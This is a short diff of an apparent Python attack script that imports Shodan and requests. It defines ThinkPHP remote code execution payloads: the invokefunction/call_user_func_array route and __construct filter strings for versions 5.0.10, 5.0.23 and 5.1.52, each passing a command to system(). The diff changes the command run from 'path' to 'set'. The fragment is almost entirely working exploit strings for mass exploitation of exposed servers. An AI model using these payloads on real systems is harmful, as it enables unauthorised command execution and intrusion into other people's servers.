@@ -2,7 +2,7 @@ import re
 import requests
 from shodan import Shodan
 
-data_route = "/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=path"
+data_route = "/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=set"
 data_5010 = "s=set&filter%5B%5D=system&_method=__construct&method="
 data_5023 = "_method=__construct&filter[]=system&method=GET&get[]=set"
 data_5152 = "c=system&f=set&&_method=filter&"
